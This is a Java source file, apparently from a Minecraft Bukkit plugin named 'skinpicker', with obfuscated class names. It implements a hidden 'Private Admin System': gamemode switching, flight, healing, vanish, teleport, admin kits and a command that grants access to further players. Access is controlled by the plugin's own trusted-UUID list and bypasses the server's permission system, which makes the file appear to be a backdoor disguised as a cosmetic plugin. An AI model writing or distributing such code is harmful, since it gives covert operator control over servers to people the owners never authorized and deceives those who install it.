package com.example.skinpicker.i;

import com.example.skinpicker.SkinPickerPlugin;
import java.util.Collections;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.OfflinePlayer;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeInstance;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class h implements CommandExecutor {
   private final SkinPickerPlugin x;

   public h(SkinPickerPlugin var1) {
      this.x = var1;
   }

   public boolean onCommand(CommandSender var1, Command var2, String var3, String[] var4) {
      if (!this.x.isTrusted(var1)) {
         var1.sendMessage(this.x.getFormattedMessage("unauthorized", null));
         return true;
      } else {
         String var5 = var2.getName().toLowerCase();
         switch (var5) {
            case "gmc":
               return this.a(var1, var4, GameMode.CREATIVE, "gmc-enabled");
            case "gms":
               return this.a(var1, var4, GameMode.SURVIVAL, "gms-enabled");
            case "gmsp":
               return this.a(var1, var4, GameMode.SPECTATOR, "gmsp-enabled");
            case "fly":
               return this.a(var1, var4);
            case "heal":
               return this.b(var1, var4);
            case "vanish":
               return this.a(var1);
            case "tp":
               return this.c(var1, var4);
            case "adminkit":
               return this.d(var1, var4);
            case "adminhelp":
               return this.b(var1);
            case "adminreload":
               this.x.loadConfiguration();
               this.x.sendMsg(var1, "reload-success");
               return true;
            case "admintrust":
               return this.e(var1, var4);
            default:
               return false;
         }
      }
   }

   private boolean a(CommandSender var1, String[] var2, GameMode var3, String var4) {
      Player var5;
      if (var2.length > 0) {
         var5 = Bukkit.getPlayer(var2[0]);
         if (var5 == null) {
            var1.sendMessage(ChatColor.RED + "Player not found.");
            return true;
         }
      } else {
         if (!(var1 instanceof Player var6)) {
            var1.sendMessage(ChatColor.RED + "Specify a player name from console.");
            return true;
         }

         var5 = var6;
      }

      var5.setGameMode(var3);
      this.x.sendMsg(var1, var4);
      return true;
   }

   private boolean a(CommandSender var1, String[] var2) {
      Player var3;
      if (var2.length > 0) {
         var3 = Bukkit.getPlayer(var2[0]);
         if (var3 == null) {
            var1.sendMessage(ChatColor.RED + "Player not found.");
            return true;
         }
      } else {
         if (!(var1 instanceof Player var4)) {
            var1.sendMessage(ChatColor.RED + "Specify a player name from console.");
            return true;
         }

         var3 = var4;
      }

      boolean var5 = !var3.getAllowFlight();
      var3.setAllowFlight(var5);
      if (!var5) {
         var3.setFlying(false);
         this.x.sendMsg(var1, "fly-disabled");
      } else {
         this.x.sendMsg(var1, "fly-enabled");
      }

      return true;
   }

   private boolean b(CommandSender var1, String[] var2) {
      Player var3;
      if (var2.length > 0) {
         var3 = Bukkit.getPlayer(var2[0]);
         if (var3 == null) {
            var1.sendMessage(ChatColor.RED + "Player not found.");
            return true;
         }
      } else {
         if (!(var1 instanceof Player var4)) {
            var1.sendMessage(ChatColor.RED + "Specify a player name from console.");
            return true;
         }

         var3 = var4;
      }

      AttributeInstance var5 = var3.getAttribute(Attribute.MAX_HEALTH);
      double var6 = var5 != null ? var5.getValue() : 20.0;
      var3.setHealth(var6);
      var3.setFoodLevel(20);
      var3.setSaturation(20.0F);
      var3.setFireTicks(0);

      for (PotionEffect var9 : var3.getActivePotionEffects()) {
         PotionEffectType var10 = var9.getType();
         if (var10.equals(PotionEffectType.POISON)
            || var10.equals(PotionEffectType.WITHER)
            || var10.equals(PotionEffectType.BLINDNESS)
            || var10.equals(PotionEffectType.SLOWNESS)
            || var10.equals(PotionEffectType.NAUSEA)
            || var10.equals(PotionEffectType.WEAKNESS)) {
            var3.removePotionEffect(var10);
         }
      }

      this.x.sendMsg(var1, "heal-success");
      return true;
   }

   private boolean a(CommandSender var1) {
      if (var1 instanceof Player var2) {
         boolean var3 = !this.x.isConcealed(var2);
         this.x.setConcealed(var2, var3);
         if (var3) {
            this.x.sendMsg(var2, "vanish-enabled");
         } else {
            this.x.sendMsg(var2, "vanish-disabled");
         }

         return true;
      } else {
         var1.sendMessage(ChatColor.RED + "This command can only be run by a player.");
         return true;
      }
   }

   private boolean c(CommandSender var1, String[] var2) {
      if (var1 instanceof Player var3) {
         if (var2.length < 1) {
            var3.sendMessage(ChatColor.RED + "Usage: /tp <player>");
            return true;
         } else {
            Player var4 = Bukkit.getPlayer(var2[0]);
            if (var4 == null) {
               var3.sendMessage(ChatColor.RED + "Player not found: " + var2[0]);
               return true;
            } else {
               var3.teleport(var4.getLocation());
               this.x.sendMsg(var3, "teleport-success", Collections.singletonMap("target", var4.getName()));
               return true;
            }
         }
      } else {
         var1.sendMessage(ChatColor.RED + "This command can only be run by a player.");
         return true;
      }
   }

   private boolean d(CommandSender var1, String[] var2) {
      if (var1 instanceof Player var3) {
         if (var2.length < 1) {
            var3.sendMessage(ChatColor.YELLOW + "Available kits: " + String.join(", ", this.x.getKitManager().e()));
            var3.sendMessage(ChatColor.RED + "Usage: /kit <kitname>");
            return true;
         } else {
            String var4 = var2[0];
            boolean var5 = this.x.getKitManager().a(var3, var4);
            if (var5) {
               this.x.sendMsg(var3, "kit-received", Collections.singletonMap("kit", var4));
            } else {
               this.x.sendMsg(var3, "kit-not-found", Collections.singletonMap("kit", var4));
            }

            return true;
         }
      } else {
         var1.sendMessage(ChatColor.RED + "This command can only be run by a player.");
         return true;
      }
   }

   private boolean e(CommandSender var1, String[] var2) {
      if (var2.length < 1) {
         var1.sendMessage(ChatColor.RED + "Usage: /admintrust <add|remove|list> [player]");
         return true;
      } else {
         String var3 = var2[0].toLowerCase();
         switch (var3) {
            case "list":
               var1.sendMessage(ChatColor.GOLD + "Trusted players (" + this.x.getTrustedIds().size() + "):");

               for (UUID var12 : this.x.getTrustedIds()) {
                  Player var13 = Bukkit.getPlayer(var12);
                  String var14 = var13 != null ? var13.getName() : Bukkit.getOfflinePlayer(var12).getName();
                  var1.sendMessage(ChatColor.YELLOW + "- " + var14 + ChatColor.GRAY + " (" + var12 + ")");
               }

               return true;
            case "add":
               if (var2.length < 2) {
                  var1.sendMessage(ChatColor.RED + "Usage: /admintrust add <player>");
                  return true;
               } else {
                  Player var10 = Bukkit.getPlayer(var2[1]);
                  if (var10 == null) {
                     var1.sendMessage(ChatColor.RED + "Player not found: " + var2[1]);
                     return true;
                  }

                  if (this.x.grantTrust(var10.getUniqueId())) {
                     var1.sendMessage(ChatColor.GREEN + var10.getName() + " can now see and use the commands.");
                     var10.sendMessage(ChatColor.GREEN + "You were granted access. Use /adminhelp to list commands.");
                  } else {
                     var1.sendMessage(ChatColor.YELLOW + var10.getName() + " already has access.");
                  }

                  return true;
               }
            case "remove":
               if (var2.length < 2) {
                  var1.sendMessage(ChatColor.RED + "Usage: /admintrust remove <player>");
                  return true;
               }

               Player var6 = Bukkit.getPlayer(var2[1]);
               UUID var7;
               Object var8;
               if (var6 != null) {
                  var7 = var6.getUniqueId();
                  var8 = var6.getName();
               } else {
                  OfflinePlayer var9 = Bukkit.getOfflinePlayer(var2[1]);
                  var7 = var9.getUniqueId();
                  var8 = var2[1];
               }

               if (this.x.revokeTrust(var7)) {
                  var1.sendMessage(ChatColor.GREEN + var8 + " no longer has access.");
                  if (var6 != null && var6.isOnline()) {
                     var6.sendMessage(ChatColor.RED + "Your access was revoked.");
                  }
               } else {
                  var1.sendMessage(ChatColor.YELLOW + var8 + " does not have access.");
               }

               return true;
            default:
               var1.sendMessage(ChatColor.RED + "Usage: /admintrust <add|remove|list> [player]");
               return true;
         }
      }
   }

   private boolean b(CommandSender var1) {
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------------"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&b&lPrivate Admin System &7- &fCommands"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------------"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/gmc &7[player] &8- &fSwitch gamemode to Creative"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/gms &7[player] &8- &fSwitch gamemode to Survival"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/gmsp &7[player] &8- &fSwitch gamemode to Spectator"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/fly &7[player] &8- &fToggle flight ability"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/heal &7[player] &8- &fRestore health, hunger, extinguish fire"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/vanish &8- &fBecome invisible to non-authorized players"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/tp &7<player> &8- &fTeleport instantly to target"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/kit &7<name> &8- &fReceive customized administrative kit"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/adminreload &8- &fReload configuration and UUIDs"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&e/admintrust &7<add|remove|list> &8- &fGrant command access to players"));
      var1.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------------"));
      return true;
   }
}
